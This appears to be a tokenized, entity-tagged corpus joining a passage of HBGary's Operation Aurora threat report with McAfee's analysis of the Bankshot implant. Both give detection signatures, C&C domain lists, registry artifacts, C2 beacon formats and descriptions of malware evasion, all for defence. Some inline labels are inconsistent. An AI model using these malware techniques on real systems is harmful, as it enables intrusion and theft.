access
due
to
memory
constraints
.

It
is
unlikely
that
the
final
payload
could
be
delivered
through
the
original
exploit
given
these
conditions
.

The
dropper
is
XOR
encrypted
with
a
0x95
key
.

The
shellcode
copies
this
encrypted
binary
to
the
user's
AppData
directory
as
'
a.exe
'
.

The
shellcode
then
decrypts
'
a.exe
'
and
moves
it
to
'
b.exe
'
in
the
same
directory
.
Then
'
b.exe
'
is
executed
.

The
following
actionable
intelligence
can
be
used
to
identify
exploit
remnants
in
the
heap
space
of
Internet
Explorer
post
exploitation
attempt
.

These
patterns
can
be
searched
for
when
doing
memory
analysis
of
a
victim
system
.

SHELLCODE
ARTIFACTS

PATTERN

Self-decrypting
code
using
a
constant
XOR
value
.
80
34
0B
D8
80
34
0B
D8

Kernel32.dll
searching
code
.
64
A1
30
00
00
00
8B
40
0C
8B
70
1C

Push
Urlmon
string
to
stack
using
two
push
statements
.
68
6F
6E
00
00
68
75
72
6C
6D

The
following
SNORT
rules
have
been
released
by
the
Emerging
Threats
project
to
detected
the
fi
nal
payload
command
and
control
communications
.

Network
Detection
Signatures

alert
tcp
$HOME_NET
any
->
$EXTERNAL_NET
443
(
msg:'ET
TROJAN

Aurora  B_malware.backdoor
Backdoor  I
(
C&C
)
client
connection
to
CnC';
fl
ow:established,to_
server;
content:'|ffffffffffff0000feffffffffffffffffff88ff|';depth:20;
fl
owbits:set,ET.aurora.init;
classtype:trojan-activity;
reference:url,www.trustedsource.org/blog/373/An-Insight-into-the-

Aurora-Communication-Protocol;
reference:url,doc.emergingthreats
.
net/2010695;
reference:url,www.emergingthreats.net/cgi-bin/cvsweb
.
cgi/sigs/VIRUS/TROJAN_Aurora;
sid:2010695;
rev:2;
)
alert
tcp
$EXTERNAL_NET
443
->
$HOME_NET
any
(
msg:'ET
TROJAN

Aurora  B_malware.backdoor
Backdoor  I
(
C&C
)
connection
CnC
response';
fl
owbits:isset,ET
.
aurora.init;
fl
ow:established,from_server;
content:'|cccccccccdcccccccdcccccccccccccc|';
depth:16;
classtype:trojan-activity;
reference:url,www.trustedsource.org/blog/373/An-Insight-into-the-

Aurora-Communication-Protocol;
reference:url,doc.emergingthreats
.
net/2010696;
reference:url,www.emergingthreats.net/cgi-bin/cvsweb
.
cgi/sigs/VIRUS/TROJAN_Aurora;
sid:2010696;
rev:2;
)

DROPPER

The
initial
dropper
is
merely
a
detonation
package
that
decompresses
an
embedded
DLL
into
the
Windows
system32
directory
and
loads
it
as
a
service
.

The
initial
dropper
is
likely
to
be
packed
(
UPX
,
etc
)
.

The
dropper
has
an
embedded
DLL
that
is
decompressed
to
the
windows
system32
directory
.

This
DLL
will
be
named
to
resemble
existing
services
(
rasmon
.
dll
,
etc
)
.
In
order
to
evade
forensics
,
the
file
-
time
of
the
dropped
DLL
will
be
modified
to
match
that
of
an
existing
system
DLL
(
user32.dll
,
etc
)
.

The
dropped
DLL
is
loaded
into
its
own
svchost.exe
process
.

Several
registry
keys
are
created
and
then
deleted
as
part
of
this
process
.

Finally
,
the
dropper
deletes
itself
from
the
system
by
using
a
dissolving
batch
fi
le
(
DFS.BAT
,
etc
)
.

ACTIONABLE
INTELLIGENCE

PATTERN

Service
Key
&
Value

Note
:
deleted
after
drop

Path
to
backdoor

Note
:
deleted
after
stage
1

Path
to
backdoor

Note
:
persistent

SOFTWARE\Microsoft\WindowsNT\
CurrentVersion\SvcHost\

Value
:
SysIns

Data
:
Ups
?
?
?
(
?
?
?
are
three
random
chars
)

SYSTEM\CurrentControlSet\Services\

Ups???\Parameters\

Value
:
ServiceDLL

Data
:
(
full
path
to
the
backdoor
)

SYSTEM\CurrentControlSet\Services\

RaS???\Parameters\

Value
:
ServiceDLL

Data
:
(
full
path
to
the
backdoor
)

February
10
,
2010
5

ACTIONABLE
INTELLIGENCE

PATTERN

SYSTEM\CurrentControlSet\Services\

RaS???\Parameters\

Value
:
ServiceDLL

Data
:
%temp%\c_####.nls
(
where
####
is
a
number
)

SYSTEM\CurrentControlSet\Services\

RaS???\Parameters\

Value
:
ServiceDLL

Data
:
%temp%\c_1758.nls

Potential
variation

Potential
variation

PAYLOAD

The
payload
uses

GLANCE
UNDER
THE
HOOD
buffer
after
phase
one
XOR
:
mJ2bhcPExs7excLThcjExqurnauYq
buffer
after
base64
decoding
:

ÃÄÆÎÞÅÂÓ...ÈÄÆ
'
'
'
̃'Ÿ'''†'š'š'ž'š'œ
two-stage
installation
.

During
stage
one
,
the
dropper
will
install
the
payload
as
a
service
running
under
the
name
Ups
?
?
?
(
where
?
?
?
are
three
random
characters
)
.

Once
executing
,
the
payload
will
immediately
delete
the
fi
rst
service
and
enter
stage-two
.

During
stage-two
,
the
payload
will
register
a
new
,
second
service
under
the
name
RaS
?
?
?
(
where
?
?
?
are
three
random
characters
)
.

This
new
service
will
point
to
the
same
backdoor
DLL
,
no
new
fi
les
are
involved
.

Note
:
the
three
character
prefixes
Ups
and
RaS
can
easily
be
modified
by
the
attacker
.

Once
the
new
service
is
registered
,
the
payload
will
access
an
embedded
resource
that
is
encrypted
.

The
decryption
goes
through
several
phases
.

The
encrypted
data
block
contains
the
DNS
name
for
the
command
and
control
server
(
homeunix.com  B_url.unknown
,
etc
)
.

This
data
block
is
configurable
before
the
malware
is
deployed
.

The
data
block
length
is
hard-coded
(
0x150
or
336
bytes
)
.

During
phase
one
,
this
data
block
is
fed
through
a
simple
XOR
(
0x99
)
,
resulting
in
an
ASCII-string
.

Next
,
the
resulting
ASCII-string
is
fed
into
a
base64
decoding
function
,
producing
a
binary
string
.

Finally
,
the
resulting
base64
decoded
binary
string
is
fed
through
another
XOR
(
0xAB
)
,
resulting
in
clear-text
.

The
three
primary
encryption
loops
are
colored
and
marked
in
Figure
1
.

The
resulting
clear-text
buffer
contains
several
fi
elds
in
both
ASCII
and
UNICODE
,
including
the
C&C
server
address
.

Figure
1
.
Base64
and
XOR
Encryption
Scheme

6
HB
GARY
THREAT
REPORT
:
OPERATION B_malware.infosteal
AURORA  I

ACTIONABLE
INTELLIGENCE

PATTERN

C&C
Server
DNS
*
.homeunix.com B_url.cncsvr
(
where
*
is
any
subdomain
)
*
.homelinux.com  B_url.cncsvr
*
.ourhobby.com B_url.cncsvr
*
.3322.org B_url.cncsvr
*
.2288.org B_url.cncsvr
*
.8866.org B_url.cncsvr
*
.ath.cx B_url.cncsvr
*
.33iqst.com B_url.cncsvr
*
.dyndns.org B_url.cncsvr
*
.linode.com B_url.cncsvr
*
.ftpaccess.cc B_url.cncsvr
*
.filoups.info B_url.cncsvr
*
.blogsite.org B_url.cncsvr

The
payload
will
create
additional
registry
keys
.

ACTIONABLE
INTELLIGENCE

PATTERN

Additional
Key

Additional
Key

HKLM\Software\Sun\1.1.2\IsoTp

HKLM\Software\Sun\1.1.2\AppleTlk

Other
potential
dropped
files
,
as
reported
by
McAfee
:

ACTIONABLE
INTELLIGENCE

PATTERN

Additional
File

Additional
File

Additional
File

Additional
File

Additional
File

Additional
File

Additional
File

Additional
File

Additional
File

Additional
File
securmon.dll

AppMgmt.dll

A0029670.dll
(
A00#####.dll
)
msconfi
g32.sys

VedioDriver.dll
acelpvc.dll
wuauclt.exe
jucheck.exe

AdobeUpdateManager.exe
zf32.dll

COMMAND
AND
CONTROL

The
payload
communicates
with
its
command
and
control
server
over
port
443
.

The
source
port
is
randomly
selected
.

While
outbound
traffic
appears
to
be
HTTPS
,
the
actual
traffic
uses
a
weak
custom
encryption
scheme
.

The
command
and
control
packets
have
a
very
specific
format.iv
command
parms
0x00000001
payload
len
CRC
KEY
payload

The
payload
section
is
encrypted
with
a
key
selected
by
using
GetTickCount
.

This
means
each
infected
node
has
its
own
key
.

The
key
is
embedded
in
the
header
of
the
packet
,
and
is
easily
recovered
.

DIAGNOSE

HOW
THE
MALWARE
WORKS

The
primary
control
logic
can
be
found
in
the
module
registered
under
the
service
key
(
rasmon.dll
,
etc
.
)
.

This
module
has
been
written
in
c
and
includes
several
specific
methods
and
encodings
that
provide
forensic
track-ability
.

The
above
screenshot
illustrates
a
REconTM
trace
on
the
malware
dropper
and
subsequent
service
creation
.

Location
A
.
represents
the
dropper
program
,
which
unpacks
itself
and
decompresses
a
fi
le
to
the
system32
directory
.

Point
B
.
represents
the
initial
svchost.exe
startup
,
which
is
loading
the
malware
payload
.

Location
C
.
is
the
actual
execution
of
the
malware
service
,
which
remains
persistent
.

At
points
E
.
and
F
.
you
can
see
the
malware
checking
in
with
the
command
and
control
server
.

Finally
,
location
D
.
represents
the
dissolvable
batch
fi
le
which
deletes
the
initial
dropper
and
then
itself
.

CAPABILITY

The
malware
has
generic
and
fl
exible
capabilities
.

There
are
distinct
command
handlers
in
the
malware
that
allow
files
to
be
stolen
and
remote
commands
to
be
executed
.

The
command
handler
is
illustrated
in
Figure
2
.

At
location
A
.
the
command
number
is
checked
.

At
locations
marked
B
.
are
each
individual
command
handler
,
as
controlled
by
the
C&C
server
and
command

February
10
,
2010
7
number
in
the
C&C
packet
.

Location
C
.
is
where
the
result
of
each
command
is
sent
back
to
the
C&C
server
.

Figure
2
.
C&C
Command
Parser

COPYCATS
AND
VARIANTS

With
the
release
of
MS10-002
,
and
the
subsequent
integration
with
Metasploit
,
the
exploit
vector
used
with

Aurora  B_malware.infosteal
has
been
adopted
laterally
within
the
malware
development
economy
.

Therefore
,
the
use
of
MS10-002
should
not
be
construed
as
an
Aurora  B_malware.infosteal
infection
without
further
analysis
of
the
dropped
payload
.

Forensic
toolmarks
and
link
analysis
have
revealed
several
different
threat
groups
who
are
employing
common
IE
exploit
vectors
.

HBGary
is
currently
tracking
several
groups
who
operate
malware
systems
of
this
nature
.

HBGary
is
using
forensic
toolmarks
to
trace
the
source
code
origins
of
binary
malware
samples
dropped
in
conjunction
with
the
MS10-002
exploit
vector
.

For
example
,
in
Figure
3
,
link
analysis
is
being
used
to
track
the
identity
of
a
threat
actor
in
conjunction
with
his
known
Digital

DNATM
.
HBGary's
Digital
DNATM
database
not
only
codifi
es
the
behavior
of
software
,
but
also
the
coding
idioms
,
algorithms
,
and
methods
of
individual
developers
.

In
this
way
,
individual
threat
actors
can
be
tracked
with
Digital
DNATM
.

In
the
example
,
link
analysis
is
provided
by
PalantirTM
.

The
screenshot
illustrates
only
a
subset
of
the
data
being
tracked
by
HBGary
,
and
sensitive
information
has
been
redacted
.

At
location
1
.
is
a
dropper
obtained
from
an
exploit
server
directly
accessed
from
the
extracted
shellcode
from
a
MS10002
JavaScript
vector
.

Location
2
.
represents
a
forensic
toolmark
within
the
dropped
executable
.

This
toolmark
was
obtained
using
physical
memory
assessment
of
the
live
executable
,
after
it
was
allowed
to
unpack
itself
in
a
virtual
machine
.

This
assessment
was
performed
with
HBGary
ResponderTM
.

At
location
3
.
,
the
recovered
toolmark(s)
were
researched
against
published
source
code
artifacts
on
the
Internet
.

From
this
,
a
single
posting
was
discovered
with
this
exact
toolmark
,
and
this
posting
exists
only
in
one
place
and
is
of
Chinese
origin
.

From
this
,
the
author
of
the
source
code
was
determined
to
be
XXXXXXXX
.

At
location
4
.
,
all
social
cyberspaces
used
by
XXXXXXX
were
then
enumerated
.

From
this
,
postings
in
Traditional
and
Simplified
Chinese
were
discovered
that
confirm
that
XXXXXX
is
the
author
and
supplier
of
a
malware
package
known
as
'
NB
'
or
'
Netbot

Attacker
'
.

Within
the
social
space
around
'
Netbot
Attacker
'
are
individuals
who
are
testing
and
/
or
asking
for
technical
support
regarding
the
malware
package
operation
.

These
individuals
have
been
grouped
within
PalantirTM
as
'
technical
support
for
bot
'
at
location
5
.

Figure
3
.
Link
Analysis
of
Malware
Actors
using
PalantirTM

The
above
process
,
when
carried
further
,
produces
many
more
social
links
.

Attribution
such
as
this
allows
resolution
and
visibility
into
the
intent
of
individual
threat
groups
.

8
HB
GARY
THREAT
REPORT
:
OPERATION B_malware.infosteal
AURORA  I

DIGITAL
DNA
INOCULATION
SHOT

HBGary
has
prepared
an
inoculation
shot
for
this
malware
.

The
inoculation
shot
is
a
small
,
signed
binary
that
will
allow
you
to
scan
for
,
and
optionally
remove
,
this
malware
from
your
Enterprise
network
.

The
aurora  B_malware.infosteal
innoculation
shot
can
be
downloaded
from
www.hbgary.com  B_url.normal
.

When
the
aurora  B_malware.infosteal
innoculation
shot
is
executed
it
will
query
the
user
for
authentication
credentials
.

Optionally
the
user
can
just
hit
'
cancel
'
to
use
the
currently
logged
on
USER's
authentication
token
.

Some
sample
usages
are
listed
below
.

To
scan
a
single
machine
:

AuroraInnoculation.exe
-scan
192.168.0.1 B_ip.normal

AuroraInnoculation.exe
-scan
MYBOXNAME

To
scan
multiple
machines
:

AuroraInnoculation.exe
-range
192.168.0.1 B_ip.normal
192.168.0.254 B_ip.normal

To
automatically
attempt
a
clean
operation
:

AuroraInnoculation.exe
-range
192.168.0.1 B_ip.normal
192.168.0.254 B_ip.normal
-clean

To
scan
a
list
of
machines
in
a
.txt
file
:

AuroraInnoculation.exe
-list
targets.txt

MCAFEE
EPO
CUSTOMERS

DETECTION
OF
AURORA  B_malware.infosteal
THREATS
WITH
DIGITAL
DNA
FOR
EPO

Customers
of
McAfee
ePolicy
Orchastrator
,
integrated
with
Digital
DNA
,
can
detect
emerging
advanced
persistent
threats
.

To
detect
Aurora  B_malware.infosteal
,
users
should
perform
a
Digital

DNA
Sequence
search
with
the
above
mentioned
sequence
for
Aurora  B_malware.infosteal
,
and
set
a
fuzzy
match
of
90%
or
greater
.

Once
machines
are
detected
,
the
user
is
encouraged
to
use
the
freely
available
inoculation
shot
to
remove
the
infection
.

RESPOND

Several
Enterprise
products
have
the
capability
to
scan
for
and
potentially
remove
the
Aurora  B_malware.infosteal
malware
.

Detection
of
the
malware
is
covered
in
detail
,
from
multiple
aspects
,
in
the
Detect
section
above
.

When
using
a
Digital
DNATM
capable
platform
such
as
McAfee
ePO
,
you
can
search
the
Enterprise
for
the
following
Digital
DNA
sequence
(
recommend
a
tight
match
,
90%
or
higher
)
.

DIGITAL
DNA
SEQUENCE
FOR
AURORA  B_malware.infosteal
MALWARE
01
B4
EE
00
AE
DA
00
8C
16
00
89
22
00
46
73
00
C6
49
00
0B
AE
01
E7
9F
04
05
81
01
0E
DF
01
79
D8
00
25
6A
00
15
49
00
47
22
00
4B
67
0F
2D
CC
01
29
67
01
35
99

To
thwart
command
and
control
and
prevent
data
loss
,
known
C&C
domains
should
be
blocked
at
the
egress
firewall
.

The
domains
listed
in
the
Detect
section
represent
a
significant
set
of
those
currently
known
to
be
operating
.

IDS
signatures
similar
to
the
one
illustrated
in
the
Detect
section
should
be
used
to
detect
inbound
exploit
attempts
,
and
machines
accepting
this
data
should
be
scanned
for
potential
infections
.

Many
A/V
products
now
contain
signatures
for
the
Aurora  B_malware.infosteal
exploit
and
will
be
effective
in
detection
and
removal
.

However
,
the
attackers
that
represent
the
threat
will
not
be
deterred
,
and
variants
of
the
attack
are
nearly
assured
.

FACTORS

C&C
protocol

Installation
and
Deployment

DESCRIPTION

If
a
variant
is
developed
,
it
will
very
likely
use
the
same
C&C
protocol
,
but
may
change
the
header
of
the
packet
and
the
constants
used
for
connection
setup
.

This
will
evade
IDS
/
Firewall
rules
designed
to
detect
the
current
scheme
.

It
is
unlikely
the
attackers
will
change
the
encryption
setup
,
however
.

The
method
used
to
install
the
service
is
highly
effective
.
Although
the
fi
lenames
will
likely
change
,
the
actual
method
will
likely
remain
.

INOCULATION

MORE
INFORMATION

ABOUT
HBGARY
,
INC

HBGary
,
Inc
is
the
leading
provider
of
solutions
to
detect
,
diagnose
and
respond
to
advance
malware
threats
in
a
thorough
and
forensically
sound
manner
.

We
provide
the
active
intelligence
that
is
critical
to
understanding
the
intent
of
the
threat
,
the
traits
associated
with
the
malware
and
information
that
will
help
make
your
existing
investment
in
your
security
infrastructure
more
valuable
.

Web
:
www.hbgary.com  B_url.normal

Corporate
Address
:
3604
Fair
Oaks
Blvd
Suite
250

Sacramento
,
CA
95762

Phone
:
916-459-4727

Fax
916-481-1460

Sales@hbgary.com  B_url.unknown

REFERENCES
i
http://siblog.mcafee.com/cto/operation-%E2%80%9Caurora%E2%80%9Dhit-google-others/ B_url.unknown
ii
http://www.thetechherald.com/article.php/201004/  B_url.unknown
5151/Was-Operation-Aurora-nothing-more-than-a-conventional-attack
iii
http://www.fjbmcu.com/chengxu/crcsuan.htm B_url.unknown
(
via
:
http://www.secureworks.com/research/blog/index.php/2010/01/20/  B_url.unknown
operation-aurora-clues-in-the-code/
)
iv
http://www.avertlabs.com/research/blog/index.php/2010/01/18/aninsight-into-the-auroracommunication-protocol/  B_url.unknown
v
http://www.symantec.com/connect/blogs/trojanhydraq-incident-analysisaurora-0-day-exploit  B_url.unknown

CORPORATE
OFFICE
3604
Fair
Oaks
Blvd
.
Ste
.
250

Sacramento
,
CA
95864
916.459.4727
Phone

CONTACT
INFORMATION
info@hbgary.com B_url.unknown
support@hbgary.com  B_url.unknown
www.hbgary.com  B_url.unknown
Hidden  B_malware.ddos
Cobra I
Targets
Turkish

Financial
Sector
With
New
Bankshot
Implant

By
Ryan
Sherstobitoff
on
Mar
08
,
2018

This
post
was
prepared
with
contributions
from
Asheer
Malhotra
,
Charles
Crawford
,
and
Jessica
Saavedra-Morales
.

On
February
28
,
the
McAfee
Advanced
Threat
Research
team
discovered
that
the
cybercrime
group
Hidden  B_malware.ddos
Cobra I
continues
to
target
cryptocurrency
and
financial
organizations
.

In
this
analysis
,
we
observed
the
return
of
Hidden  B_malware.ddos
Cobra's I
Bankshot
malware
implant
surfacing
in
the
Turkish
financial
system
.

Based
on
the
code
similarity
,
the
victim's
business
sector
,
and
the
presence
of
control
server
strings
,
this
attack
resembles
previous
attacks
by
Hidden  B_malware.ddos
Cobra I
conducted
against
the
global
financial
network
SWIFT
.

In
this
new
,
aggressive
campaign
we
see
a
return
of
the
Bankshot
implant
,
which
last
appeared
in
2017
.

Bankshot
is
designed
to
persist
on
a
victim's
network
for
further
exploitation
;
thus
the
Advanced
Threat
Research
team
believes
this
operation
is
intended
to
gain
access
to
specific
financial
organizations
.

Based
on
our
analysis
,
financial
organizations
in
Turkey
were
targeted
via
spear
phishing
emails
containing
a
malicious
Microsoft
Word
document
.

The
document
contains
an
embedded
Adobe
Flash
exploit
,
which
was
recently
announced
by
the
Korean
Internet
Security
agency
.

The
exploit
,
which
takes
advantage
of
CVE-2018-4878
,
allows
an
attacker
to
execute
arbitrary
code
such
as
an
implant
.

the
Further
investigation
into
this
campaign
and
analysis
of
McAfee
product
telemetry
shows
that
the
infection
occurred
on
March
2
and
3
.

The
implant's
first
target
was
a
major
government-controlled
financial
organization
.

It
next
appeared
in
another
Turkish
government
organization
involved
in
finance
and
trade
.

A
further
three
large
financial
institutions
in
Turkey
were
victims
of
this
attack
.

The
implant
has
so
far
not
surfaced
in
any
other
sector
or
country
.

This
campaign
suggests
the
attackers
may
plan
a
future
heist
against
these
targets
by
using
Bankshot
to
gather
information
.

Bankshot
implants
are
distributed
from
a
domain
with
a
name
similar
to
that
of
the
cryptocurrency-lending
platform
Falcon
Coin
,
but
the
similarly
named
domain
is
not
associated
with
the
legitimate
entity
.

The
malicious
domain
falcancoin.io
was
created

December
27
,
2017
,
and
was
updated
on
February
19
,
only
a
few
days
before
the
implants
began
to
appear
.

These
implants
are
variations
of
earlier
forms
of
Bankshot
,
a
remote
access
tool
that
gives
an
attacker
full
capability
on
a
victim's
system
.

This
implant
also
contains
functionality
to
wipe
files
and
content
from
the
targeted
system
to
erase
evidence
or
perform
other
destructive
actions
.

Bankshot
was
first
reported
by
the
Department
of
Homeland
Security
on
December
13
,
2017
,
and
has
only
recently
resurfaced
in
newly
compiled
variants
.

The
sample
we
analyzed
is
99%
similar
to
the
documented
Bankshot
variants
from
2017
.

mcafee_labs

McAfee
on
Twitter

Follow
us
on
Twitter

Did
you
get
served
an
ad
about
something
you
were
talking
about
?
In
our
Predictions
Report
we
discuss
how
our
conne
...
https://t.co/4ZQSgDurWw
4
hours
ago

Reply
·
Retweet
·
Favorite
mcafee_labs

In
a
recent
campaign
,
the
Sun

Team
hacking
group
implanted
spyware
on
victims
'
mobile
devices
by
uploading
maliciou
...
https://t.co/Ho6RhSKo5E
8
hours
ago

Reply
·
Retweet
·
Favorite
mcafee_labs

Operation
GhostSecret
used
multiple
#malware
implants
,
including
an
unknown
impact
with
capabilities
similar
to
Ban
...
https://t.co/20oXNJnL9L
3
days
ago

Reply
·
Retweet
·
Favorite

Next
Article

Bankshot
implants
hosted
on
falcancoin.io
.

The
Bankshot
implant
is
attached
to
a
malicious
Word
document
with
the
filename
Agreement.docx
.

The
document
appears
to
be
an
agreement
template
for
Bitcoin
distribution
between
an
unknown
individual
in
Paris
and
a
to-be-determined
cryptocurrency
exchange
.

The
author
of
this
document
is
test-pc
.

It
was
created
February
26
and
was
submitted
from
the
Netherlands
.

The
document
contains
an
embedded
Flash
script
that
exploits
CVE-2018-4878
and
downloads
and
executes
the
DLL
implant
from
falcancoin.io
.

We
discovered
two
more
documents
,
written
in
Korean
,
that
exploit
the
same
vulnerability
as
Agreement.docx
.

These
documents
appear
to
be
part
of
the
same
campaign
and
may
have
been
used
on
different
targets
.

These
documents
also
communicated
with
falcancoin.io
to
install
Bankshot
and
also
contain
themes
around
cryptocurrency
security
.

Two
Flash
files
exploit
CVE-2018-4878
.

843c17b06a3aee22447f021307909890b68828b9
(
February
25
)
343ebca579bb888eb8ccb811f9b52280c72e484c
(
February
25

Malicious
documents
in
the
attack
.

McAfee
Partners

International
Women's
Day
in
the
Channel

Malicious
document
exploiting
CVE-2018-4878
.

The
implants
are
downloaded
via
a
Flash
file
embedded
in
the
malicious
document
.

They
are
executed
when
the
victim
views
the
document
.

The
malicious
site
falcancoin.io
embedded
in
the
Flash
file
.

Implant
directory
contained
in
the
malicious
Flash
file
.

The
implants
(
DLLs
)
are
disguised
as
ZIP
files
and
communicate
with
three
control
servers
,
two
of
them
Chinese-language
online
gambling
sites
.

These
URLs
can
be
found
hardcoded
in
the
implants
'
code
.

Hardcoded
control
server
URLs
.

Analyzing
Bankshot

The
sample
(
a2e966edee45b30bb6bb5c978e55833eec169098
)
is
a
Windows
DLL
that
serves
as
a
backdoor
and
contains
a
variety
of
capabilities
.

The
malicious
DLL
is
not
a
service
DLL
because
it
lacks
ServiceMain()
.

To
mask
itself
,
it
can
run
as
a
regular
library
loaded
into
a
legitimate
process
.

The
malware
begins
by
creating
a
new
thread
from
the
DllMain()
function
to
carry
out
its
malicious
activities
:

New
thread
created
in
the
malware's
DllMain()
function
.

The
malware
performs
the
following
activities
:

Builds
imports
by
dynamically
loading
APIs
.

Decrypts
strings
needed
for
control
server
communications
.

Performs
control
server
communications
.

Handles
commands
issued
by
the
control
server
.

Uninstalls
self
from
the
system
.

The
malicious
thread
dynamically
loads
the
APIs
it
needs
at
the
beginning
of
its
execution
using
LoadLibrary()
and
GetProcAddress()
.

APIs
from
the
following
libraries
are
loaded
at
runtime
:

Kernel32.dll

Ws2_32/wsock32.dll

Apvapi32.dll

Oleaut32.dll

Iphlp.dll

Urlmon.dll

A
dynamic
API
loaded
by
the
malware
.

Based
on
packet
capture
analysis
of
previous
implants
from
2017
,
the
following
strings
are
used
in
control
server
communications
:

Connection
:
keep-alive

Cache-Control
:
max-age=0

Accept
:
*/*

Content-Type
:
multipart/form-data;
boundary=

Content-Type
:
application/octet-stream

Accept-Encoding
:
gzip,deflate,sdch

Accept-Language
:
ko-KR
->
Korean

Content-Disposition
:
form-data;name='board_id
'

Content-Disposition
:
form-data;name='user_id
'

Content-Disposition
:
form-data;name='file1′′;
filename='img01_29.jpg
'

Content-Disposition
:
form-data;name='file1′′;
filename='my.doc
'

Content-Disposition
:
form-data;name='file1′′;
filename='pratice.pdf
'

Content-Disposition
:
form-data;name='file1′′;
filename='king.jpg
'

Content-Disposition
:
form-data;name='file1′′;
filename='dream.avi
'

Content-Disposition
:
form-data;name='file1′′;
filename='hp01.avi
'

Content-Disposition
:
form-data;name='file1′′;
filename='star.avi
'

User
Agents

The
implant
either
fetches
the
user
agent
from
Internet
Explorer
(
using
ObtainUserAgentAsString()
)
or
uses
a
default
user
agent
specified
in
the
malware
binary
:

Mozilla/5.0
(
Windows
NT
6.1;
WOW64
)
Chrome
/
28.0.1500.95
Safari
/
537.36

Control
Server
Communications

The
malware
initiates
communication
with
the
control
server
by
sending
it
an
HTTP
POST
request
with
additional
optional
HTTP
data
,
such
as
:
------FormBoundary<randomly_generated_characters>

Content-Disposition
:
form-data;
name='board_id
'
8306
------FormBoundary<randomly_generated_characters>

Content-Disposition
:
form-data;
name='user_id
'
*dJU!*JE&!M@UNQ@
------FormBoundary<randomly_generated_characters>

Content-Disposition
:
form-data;
name='file1';
filename='king.jpg
'

Content-Type
:
application/octet-stream
board_id
is
a
four-digit
number
that
may
be
an
identifier
for
a
campaign
ID
.
Based
on
analysis
of
previous
samples
,
this
is
a
unique
identifier
.

user_id
is
a
hardcoded
value
in
the
malware
binary
that
is
sent
to
the
control
server
.

The
username
appears
to
be
attacker
specified
and
has
occurred
in
2017
Bankshot
samples
.

This
links
the
previous
samples
with
this
unique
username
.

filename
is
based
on
static
analysis
.

This
looks
like
a
specific
beacon
to
indicate
that
the
malware
is
ready
to
receive
commands
.

The
optional
HTTP
data
with
king.jpg
looks
like
a
beacon
to
inform
the
control
server
that
the
malware
is
ready
to
accept
new
commands
:

Commands
received
from
the
control
server
are
encoded
DWORDs
.

After
decoding
,
these
DWORDs
should
be
in
the
range
123459h
to
123490h
.

Malware
checking
to
make
sure
a
received
command
is
in
the
correct
range
.

The
command
index
calculator
and
jump
to
the
appropriate
command
.

The
command
index
table
and
command
handler
address
table
.

Implant
Capabilities

Based
on
the
responses
received
from
the
control
server
,
the
malware
can
carry
out
the
following
malicious
tasks
:

Recursively
generate
a
list
of
files
in
a
directory
and
send
to
the
control
server
.

Terminate
a
specific
process
.

The
process
is
identified
by
the
control
server
sending
the
PID
to
the
malware
.

The
capability
to
terminate
a
process
.

Gather
network
addresses
and
operating
system
version
.

Execute
arbitrary
commands
using
'
cmd.exe
/c
'
.

The
capability
to
execute
system
commands
.

Spawning
arbitrary
processes
.

Create
processes
.

Write
responses
from
the
control
server
to
a
file
.

Send
information
for
all
drives
.

Write
data
sent
by
the
control
server
to
a
temporary
file
matching
the
file
path
pattern
%temp%\DWS00*
.

Change
the
time
of
a
file
as
specified
by
the
control
server
.

The
malware
changing
the
file
time
.

Create
a
process
by
impersonating
a
logged-on
user
.

Getting
a
user
token
using
WTSQueryUserToken
.

A
process
created
as
logged-in
user
.

Gather
the
process
time
for
all
processes
.

Getting
time
information
for
all
processes
running
on
the
system
.

Gather
domain
and
account
names
based
on
all
running
processes
.

Gathering
account
information
from
running
processes
.

Read
a
specified
file's
contents
and
send
the
data
to
the
control
server
.

Write
data
sent
by
the
control
server
to
an
existing
file
.

Mark
a
file
to
be
deleted
on
reboot
.

Marking
a
file
for
deletion
on
reboot
.

Overwrite
a
file
with
all
zeros
and
mark
it
for
deletion
on
reboot
.

Wiping
files
with
zeros
and
marking
it
for
deletion
on
reboot
.

Delete
files
using
the
DeleteFile()
API
.

Load
an
arbitrary
library
into
its
process
space
.

This
may
be
used
to
load
additional
downloaded
components
of
the
attack
.

Loading
an
arbitrary
library
into
its
own
process
space
.

After
every
action
is
performed
the
malware
sends
a
response
to
the
control
server
indicating
whether
the
action
was
successful
.

Connections

The
US
government
reports
that
Bankshot
is
used
by
Hidden  B_malware.ddos
Cobra I
to
target
multiple
industries
including
financial
organizations
.

This
implant
has
been
connected
to
a
major
Korean
bank
attack
and
is
also
known
as
Trojan
Manuscript
.

That
variant
contained
the
capability
to
search
for
hosts
related
to
the
SWIFT
network
and
the
same
control
server
strings
as
the
variant
we
found
targeting
the
Turkish
financial
sector
.

The
implant
does
not
conduct
financial
transactions
;
rather
it
is
a
channel
into
the
victim's
environment
,
in
which
further
stages
of
implants
can
be
deployed
for
financial
reconnaissance
.

The
Bankshot
implant
was
also
observed
in
2017
in
documents
appearing
to
come
from
Latin
American
banks
.

Malicious
document
delivering
the
Bankshot
implant
in
2017
.

These
connections
,
combined
with
the
implant's
nearly
identical
appearance
to
known
variants
,
are
a
strong
indication
that
we
have
uncovered
a
Hidden  B_malware.ddos
Cobra I
attack
.

Further
,
previous
implants
from
2017
contained
bogus
documents
with
financially
themed
content
.

A
code
comparison
of
hash
12c786c490366727cf7279fc141921d8  B_hash
with
hash
6de6a0df263ecd2d71a92597b2362f2c  B_hash
(
from
November
28
,
2017
)
.

Conclusion

We
have
found
what
may
be
an
early
data-gathering
stage
for
future
possible
heists
from
financial
organizations
in
Turkey
(
and
possibly
other
countries
)
.

In
this
campaign
,
we
see
the
adoption
of
a
recent
zero-day  B_malware.drop
Adobe
Flash
vulnerability
to
get
the
implant
onto
the
victim's
systems
.

The
campaign
has
a
high
chance
of
success
against
victims
who
have
an
unpatched
version
of
Flash
.

Documents
with
the
Flash
exploit
managed
to
evade
static
defenses
and
remain
undetected
as
an
exploit
on
VirusTotal
.

This
is
the
first
time
that
Bankshot
has
been
tied
directly
to
financial-related
hacking
and
the
first
time
it
has
been
used
since
November
2017
.

McAfee
detects
these
threats
as
:

RDN
/
Generic
Exploit

RDN
/
Generic.dx

Generic
PWS.y

Generic.hbg

Exploit-CVE2018-4878

McAfee
customers
are
also
covered
by
McAfee
Global
Threat
Intelligence
Web
Reputation
classification
,
which
rate
these
URLs
as
High
Risk
.

Indicators
of
Compromise

MITRE
ATT&CK
techniques

Exfiltration
over
command
and
control
channel

Commonly
used
port

Command-line
interface

Service
execution

Automated
collection

Data
from
local
system

Process
discovery

System
time
discovery

Credential
dumping

Exploitation
of
vulnerability

Process
injection

File
deletion

Hashes
